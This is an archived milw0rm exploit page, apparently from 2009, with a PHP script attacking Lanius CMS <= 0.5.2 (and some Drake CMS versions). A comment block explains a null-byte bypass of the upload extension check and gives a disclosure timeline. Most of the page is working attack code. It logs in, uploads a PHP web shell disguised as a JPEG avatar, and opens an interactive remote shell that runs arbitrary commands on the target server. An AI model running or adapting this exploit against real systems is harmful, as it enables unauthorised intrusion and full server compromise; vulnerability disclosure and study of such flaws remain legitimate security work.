<html><head><title>Lanius CMS <= 0.5.2 Remote Arbitrary File Upload Exploit</title></head><pre>&lt;?php

/*
	--------------------------------------------------------
	Lanius CMS &lt;= 0.5.2 Remote Arbitrary File Upload Exploit
	--------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.laniuscms.org/
	details..: this vulnerability affects all Drake CMS &gt;= 0.4.6 and Lanius CMS &lt;= 0.5.2 r1050
 
	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.

	[-] vulnerable code in /includes/upload.php (in_upload() function)

	52.		if ($file_sz &gt; $max_sz )
	53.			return sprintf(_UPLOAD_TOO_BIG, convert_bytes($file_sz), convert_bytes($max_sz));
	54.			
	55.		$thy_name = basename(urldecode($_FILES[$elem]['name']));
	56.		if (isset($allowed_ext)) {
	57.			$ext = file_ext($thy_name);
	58.			if (($ext==='') || (!in_array($ext, $allowed_ext)))
	59.				return sprintf(_UPLOAD_DISALLOWED_EXT, implode(', ',$allowed_ext));
	60.		}
	61.		$orig_name = $thy_name;

	[-] file_ext() function defined into /includes/functions.php

	101.	function file_ext($file)
	102.	{
	103.		$p = strrpos($file, '.');
	104.		if ($p===false)return '';
	105.		return strtolower(substr($file,$p+1));
	106.	}

	Cause of the uploaded filename is passed to urldecode() function is possibile to inject a null
	char to bypass the extension's check. This is possibile because strrpos() function, used into
	file_ext() function, is binary-safe, so by passing a filename e.g. test.php%00.jpg this function
	returns 'jpg', but the file will be saved as test.php by move_uploadad_file() function.

	[-] Disclosure timeline:
		
	[05/04/2009] - Bug discovered
	[06/04/2009] - Vendor contacted
	[06/04/2009] - Vendor replied
	[07/04/2009] - Fix released: http://www.laniuscms.org/?option=content&amp;id=81
	[07/04/2009] - Public disclosure
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
	  die(&quot;\nsocket_create(): &quot; . socket_strerror($s) . &quot;\n&quot;);

	if (socket_connect($s, $host, 80) == false)
	  die(&quot;\nsocket_connect(): &quot; . socket_strerror(socket_last_error()) . &quot;\n&quot;);

	socket_write($s, $packet, strlen($packet));
	while ($m = socket_read($s, 2048)) $response .= $m;

	socket_close($s);
	return $response;
}

function login()
{
	global $host, $path, $username, $password, $sid;
	
	print &quot;\n[-] Logging in with username '{$username}' and password '{$password}'\n&quot;;
	
	$payload = &quot;username={$username}&amp;password={$password}&amp;task=login&quot;;
	$packet  = &quot;POST {$path}?option=login HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
	$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	$packet .= $payload;

	$response = http_send($host, $packet);
	preg_match(&quot;/PHPSESSID=([0-9a-f]{32})/i&quot;, $response, $match);
	$sid = $match[1];
	
	if (!preg_match(&quot;/Location: index.php/i&quot;, $response))
		die(&quot;[-] Incorrect username/password\n&quot;);
}

function upload()
{
	global $host, $path, $sid, $username, $password;

	login();
	
	$avatar = &quot;media/forum/avatars/custom/poc.php&quot;;
	$params = array('user_name' =&gt; $username,
					'user_password_orig' =&gt; $password,
					'user_email' =&gt; 'foo@bar.com',
					'btnsubmit' =&gt; 'Update',
					'task' =&gt; 'update');

	foreach ($params as $name =&gt; $value)
		$payload .= &quot;--o0oOo0o\r\nContent-Disposition: form-data; name=\&quot;{$name}\&quot;\r\n\r\n{$value}\r\n&quot;;

	$payload .= &quot;--o0oOo0o\r\nContent-Disposition: form-data; name=\&quot;user_uploaded_avatar\&quot;; filename=\&quot;poc.php%00.jpg\&quot;\r\n&quot;;
	$payload .= &quot;Content-Type: image/jpeg\r\n\r\n&quot;;
	$payload .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?&gt;\r\n&quot;;
	$payload .= &quot;--o0oOo0o--\r\n&quot;;
	
	$packet  = &quot;POST {$path}?option=user HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Cookie: PHPSESSID={$sid}\r\n&quot;;
	$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
	$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	$packet .= $payload;

	http_send($host, $packet);

	$packet  = &quot;GET {$path}{$avatar} HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	if (preg_match('/200 OK/i', http_send($host, $packet)))
		return $avatar;

	die(&quot;[-] Upload failed\n&quot;);
}

print &quot;\n+------------------------------------------------------------------+&quot;;
print &quot;\n| Lanius CMS &lt;= 0.5.2 Remote Arbitrary File Upload Exploit by EgiX |&quot;;
print &quot;\n+------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 5)
{
	print &quot;\nUsage......: php $argv[0] &lt;host&gt; &lt;path&gt; &lt;username&gt; &lt;password&gt;\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost / user pass&quot;;
	print &quot;\nExample....: php $argv[0] localhost /lanius/ user pass\n\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];
$username = $argv[3];
$password = $argv[4];

$path .= upload();

$packet  = &quot;GET {$path} HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while(1)
{
	print &quot;\nlanius-shell# &quot;;
	if (($cmd = trim(fgets(STDIN))) == &quot;exit&quot;) break;
	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
	preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed\n&quot;);
}

?&gt;

# milw0rm.com [2009-04-07]</pre></html>